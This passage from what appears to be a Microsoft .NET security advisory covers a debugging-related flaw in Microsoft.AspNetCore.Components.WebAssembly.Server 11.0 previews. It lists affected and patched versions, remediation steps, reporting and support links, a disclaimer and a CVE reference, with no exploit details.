[Microsoft.AspNetCore.Components.WebAssembly.Server](https://www.nuget.org/packages/Microsoft.AspNetCore.Components.WebAssembly.Server) | >= 11.0.0-preview.1, <= 11.0.0-rc.1 | 11.0.0-rc.2.26478.115 ## Advisory FAQ ### How do I know if I am affected? You are affected if you use a vulnerable version of `Microsoft.AspNetCore.Components.WebAssembly.Server` to debug a Blazor WebAssembly application and evaluate an expression involving attacker-controlled application data. ### How do I fix the issue? 1. Install the latest supported version of .NET. 2. Update `Microsoft.AspNetCore.Components.WebAssembly.Server` to the patched version for the .NET release used by the application. Once the updated package or runtime is installed, restart the debugger and development environment. ## Other Information ### Reporting Security Issues If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the [MSRC Researcher Portal](https://msrc.microsoft.com/report/vulnerability/new). Further information can be found in the MSRC [Report an Issue FAQ](https://www.microsoft.com/msrc/faqs-report-an-issue). Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty. ### Support You can ask questions about this issue on GitHub in the .NET GitHub organization. The main repositories are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnetcore. The Announcements repository (https://github.com/dotnet/announcements) will contain this bulletin as an issue and will include a link to a discussion issue. ### Disclaimer The information provided in this advisory is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply. ### External Links [CVE-2026-102870](https://www.cve.org/CVERecord?id=CVE-2026-102870) ### Acknowledgements alittleston3 ### Revisions V1.0 (10/13/2026): Advisory published.
